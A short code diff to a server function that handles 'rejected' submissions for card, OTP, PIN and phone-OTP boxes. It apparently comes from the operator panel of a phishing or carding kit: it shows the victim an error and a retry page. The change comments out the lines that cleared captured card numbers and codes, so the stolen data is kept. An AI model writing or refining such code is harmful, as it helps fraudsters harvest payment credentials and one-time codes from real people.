@@ -997,11 +997,11 @@ async function startServer() {
           currentPage: targetPage,
           [config.statusField]: "rejected",
           [`${boxType}RejectionMessage`]: config.errorMessage,
-          // Clear the submitted data to allow retry
-          ...(boxType === 'card' && { _v1: null, cardNumber: null }),
-          ...(boxType === 'otp' && { _v5: null, otpCode: null }),
-          ...(boxType === 'pin' && { _v6: null, pinCode: null }),
-          ...(boxType === 'phone' && { _v7: null, phoneOtp: null }),
+          // Don't clear submitted data - keep it so the box still shows
+          // ...(boxType === 'card' && { _v1: null, cardNumber: null }),
+          // ...(boxType === 'otp' && { _v5: null, otpCode: null }),
+          // ...(boxType === 'pin' && { _v6: null, pinCode: null }),
+          // ...(boxType === 'phone' && { _v7: null, phoneOtp: null }),
         };
         
       } else {
